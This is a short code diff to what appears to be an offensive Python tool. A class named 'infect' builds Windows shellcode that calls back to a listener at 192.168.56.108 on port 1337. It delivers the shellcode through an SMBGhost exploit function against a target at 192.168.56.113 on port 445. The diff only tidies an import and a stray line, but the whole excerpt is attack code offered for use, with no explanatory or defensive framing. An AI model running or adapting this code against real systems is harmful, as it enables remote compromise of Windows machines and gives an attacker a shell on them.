@@ -1,6 +1,6 @@
 import binascii
 import subprocess
-from armory.SMBGhost import *
+import armory.SMBGhost.exploit as exploit
 
 
 class infect:
@@ -32,9 +32,6 @@ class infect:
     def inject(self):
         shell = self.generate_windows_shellcode(self.lhost,self.lport)
         result = exploit.exploit_SMBGhost(self.rhost, self.rport, shell)
-        pass
-
-    
     
     
 s=infect("192.168.56.113","445","192.168.56.108","1337")
